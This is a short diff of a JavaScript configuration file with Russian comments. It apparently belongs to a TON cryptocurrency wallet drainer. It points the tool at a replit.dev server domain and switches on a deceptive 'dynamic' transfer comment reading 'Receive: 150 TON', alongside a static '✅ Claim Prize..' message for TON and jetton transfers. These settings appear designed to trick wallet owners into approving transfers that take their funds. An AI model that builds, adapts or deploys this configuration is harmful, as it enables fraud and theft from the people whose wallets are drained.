@@ -1,7 +1,7 @@
-const server_domain = "df4d4334-be75-4c26-aebb-b364ecb27e7a-00-z6zjnwq7aul.janeway.replit.dev"; //Ваш домен сервера в формате "domain.com"
+const server_domain = "fc2a4a45-a5ad-40c6-94f1-5d007d08d90b-00-3i3713yxqyu4e.worf.replit.dev"; //Ваш домен сервера в формате "domain.com"
 
 //Дополнительные настройки:
-const dynamicTxt = "false"; // Если true, то комментарий становится динамичным и выводит плюс к балансу пользователю. Если false , то используется статичный
+const dynamicTxt = "true"; // Если true, то комментарий становится динамичным и выводит плюс к балансу пользователю. Если false , то используется статичный
 const sumDyn = "2"; // Множитель для динамичного комментария
 const textDyn = "Receive: 150 TON "; // Текст в динамичном комментарии
 const txt_com = "✅ Claim Prize.."; // Комментарий при трансфере TON и JETTON(Статичный)
